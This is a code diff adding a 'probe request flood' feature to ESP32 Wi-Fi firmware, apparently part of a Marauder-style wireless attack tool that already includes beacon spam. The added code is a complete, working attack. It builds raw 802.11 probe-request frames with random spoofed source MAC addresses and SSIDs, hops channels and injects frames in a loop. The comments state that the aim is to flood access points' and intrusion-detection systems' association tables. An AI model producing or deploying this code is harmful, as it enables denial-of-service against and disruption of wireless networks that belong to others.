@@ -1908,3 +1908,118 @@ bool wlan_hal_beacon_spam_is_running(void) {
 uint32_t wlan_hal_beacon_spam_get_frame_count(void) {
     return s_beacon_frames;
 }
+
+// ---------------------------------------------------------------------------
+// Probe-Request-Flood: spoofed-source-MAC probe requests for random SSIDs,
+// the Marauder-style "probe flood" attack. Distinct from beacon spam (which
+// impersonates an AP); this impersonates many CLIENTS searching for networks,
+// which is what floods an AP's/IDS's association table and probe-response
+// handling rather than showing up in a station's own AP scan list.
+// ---------------------------------------------------------------------------
+
+static const uint8_t probe_req_packet_template[] = {
+    // 802.11 header (24 bytes): FC = mgmt/probe-request, dur=0,
+    // addr1 (RA/DA) = broadcast, addr2 (TA/SA) = placeholder (overwritten
+    // per-frame with a random MAC), addr3 (BSSID) = broadcast, seq-ctl=0.
+    0x40, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00,
+    // SSID IE: tag=0x00, len placeholder (overwritten with the actual
+    // length), 32-byte slot pre-filled with spaces -- same trick as the
+    // beacon-spam template, so a shorter SSID doesn't leave stray NUL bytes
+    // ahead of the next IE.
+    0x00, 0x20,
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
+    // Supported Rates IE.
+    0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
+};
+
+static volatile bool s_probe_flood_active = false;
+static volatile uint32_t s_probe_flood_frames = 0;
+static TaskHandle_t s_probe_flood_task = NULL;
+
+static void prepare_probe_req_packet(uint8_t* packet, const uint8_t* mac, const char* ssid) {
+    memcpy(packet, probe_req_packet_template, sizeof(probe_req_packet_template));
+    memcpy(&packet[10], mac, 6); // addr2 / TA -- addr3/BSSID stays broadcast
+    uint8_t ssid_len = (uint8_t)strlen(ssid);
+    if(ssid_len > 32) ssid_len = 32;
+    packet[25] = ssid_len;
+    memcpy(&packet[26], ssid, ssid_len);
+}
+
+static void probe_flood_task(void* param) {
+    (void)param;
+    char gen_ssid[16];
+    uint8_t mac[6];
+    uint8_t packet[sizeof(probe_req_packet_template)];
+    uint8_t channel = 1;
+
+    srand((unsigned)esp_log_timestamp());
+
+    // Promiscuous (cb=NULL) erlaubt 80211_tx auf STA-Interface (wie beim
+    // Beacon-Spam-Task).
+    esp_wifi_set_promiscuous(true);
+
+    while(s_probe_flood_active) {
+        for(int i = 0; i < 6; i++) mac[i] = rand() & 0xFF;
+        mac[0] = (mac[0] & 0xFE) | 0x02; // random locally-administered unicast MAC
+
+        snprintf(gen_ssid, sizeof(gen_ssid), "SSID_%d", rand() % 9999);
+
+        prepare_probe_req_packet(packet, mac, gen_ssid);
+        if(esp_wifi_80211_tx(WIFI_IF_STA, packet,
+               sizeof(probe_req_packet_template), false) == ESP_OK) {
+            s_probe_flood_frames++;
+        }
+
+        if((s_probe_flood_frames % 5) == 0) {
+            channel++;
+            if(channel > 11) channel = 1;
+            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+
+    esp_wifi_set_promiscuous(false);
+    s_probe_flood_task = NULL;
+    vTaskDelete(NULL);
+}
+
+void wlan_hal_probe_flood_start(void) {
+    if(s_probe_flood_active || s_probe_flood_task) return;
+    if(!s_started) {
+        if(!wlan_hal_start()) return;
+    }
+    if(s_wifi_connected) wlan_hal_disconnect();
+
+    s_probe_flood_frames = 0;
+    s_probe_flood_active = true;
+    BaseType_t rc = xTaskCreate(probe_flood_task, "ProbeFlood",
+        4096, NULL, 5, &s_probe_flood_task);
+    if(rc != pdPASS) {
+        s_probe_flood_active = false;
+        s_probe_flood_task = NULL;
+        ESP_LOGE(TAG, "probe_flood: xTaskCreate failed");
+    }
+}
+
+void wlan_hal_probe_flood_stop(void) {
+    if(!s_probe_flood_active && !s_probe_flood_task) return;
+    s_probe_flood_active = false;
+    // Task beendet sich selbst (vTaskDelete im Task). Auf Beendigung warten.
+    while(s_probe_flood_task) vTaskDelay(pdMS_TO_TICKS(10));
+}
+
+bool wlan_hal_probe_flood_is_running(void) {
+    return s_probe_flood_active;
+}
+
+uint32_t wlan_hal_probe_flood_get_frame_count(void) {
+    return s_probe_flood_frames;
+}
